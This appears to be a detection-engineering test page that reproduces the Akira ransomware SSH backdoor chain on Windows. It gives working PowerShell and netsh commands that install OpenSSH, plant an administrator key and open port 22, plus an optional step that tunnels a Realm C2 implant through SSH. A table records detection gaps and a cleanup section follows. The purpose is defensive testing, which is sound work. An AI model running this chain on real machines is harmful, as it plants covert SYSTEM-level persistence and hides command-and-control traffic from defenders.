# Test: Persistence — the Akira SSH backdoor chain (real-actor TTP)

**The technique (research):** the exact chain from [CISA's Akira advisory (AA24-109A)](https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a)
and [Intrinsec's incident analysis](https://www.intrinsec.com/akira_ransomware/): install
Windows OpenSSH Server, drop the operator's key into
**`C:\ProgramData\ssh\administrators_authorized_keys`** — the admin-level path almost
nobody monitors ([Maxwell CTI deep dive](https://maxwellcti.com/tool-deep-dives/ssh/open-ssh/))
— and open the firewall with `netsh advfirewall firewall add rule` named
"OpenSSH Server (sshd)". Result: quiet, legitimate-looking, key-authenticated SYSTEM
shell persistent across reboots. [Splunk's netsh analysis](https://www.splunk.com/en_us/blog/security/netsh-firewall-evasion-techniques.html)
covers the firewall-half detection.

**Detections to implement later (filed in future-detections-research.md):** an auditor
category diffing `administrators_authorized_keys` + per-user `authorized_keys`; a
`PROC-NETSH-FIREWALL` rule (`advfirewall firewall add` / `Set-NetFirewallProfile
-Enabled False`); sshd install telemetry.

**Pairing with Realm C2:** once SSH is in, the operator tunnels imix's gRPC traffic
through the SSH channel (`ssh -L 8080:172.16.69.109:8080`) — Tavern traffic hidden inside
an encrypted, legitimately-logged SSH session. The walkthrough's final step simulates the
tunnel so your flow sensor can see what it looks like.

## Manual test (victim, elevated PowerShell)

`.\test.ps1` runs the chain; step-by-step equivalent:

```powershell
# 1. install the OpenSSH server (the legit way - looks like admin work)
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd; Set-Service sshd -StartupType Automatic

# 2. drop the "operator key" (generate a benign one for the test)
ssh-keygen -t ed25519 -f $env:TEMP\testkey -N '""'
Add-Content C:\ProgramData\ssh\administrators_authorized_keys (Get-Content $env:TEMP\testkey.pub)

# 3. open the firewall exactly as Akira did
netsh advfirewall firewall add rule name="OpenSSH Server (sshd)" dir=in action=allow protocol=TCP localport=22
```

**4. (optional, real-implant mode)** from the attacker box, tunnel Tavern through the
backdoor and point a pre-built imix at the tunnel:
```bash
ssh -i testkey -L 8080:127.0.0.1:8080 Administrator@<victim>   # attacker box
# victim-side imix built with IMIX_CALLBACK_URI=http://127.0.0.1:8080
```

**Expected vs gap:**

| Signal | Today |
|---|---|
| `sshd` service install/start | ✅ `EVT-7045` + `PERS-SERVICE` (service install is a service install) |
| `netsh advfirewall ... add rule` | ❌ GAP — no rule keys on firewall manipulation |
| `administrators_authorized_keys` appears/changes | ❌ GAP — no auditor category for SSH key files |
| imix over the SSH tunnel | ⚠️ `NET-BEACON` may fire on the loopback leg; the SSH leg shows as one `:22` flow — the *cadence* survives tunneling, the *destination* doesn't |

**Cleanup:** remove the firewall rule (`netsh advfirewall firewall delete rule
name="OpenSSH Server (sshd)"`), delete the key file lines, `Stop-Service sshd` +
`Remove-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0` (or leave sshd
disabled if you want it for later tests).
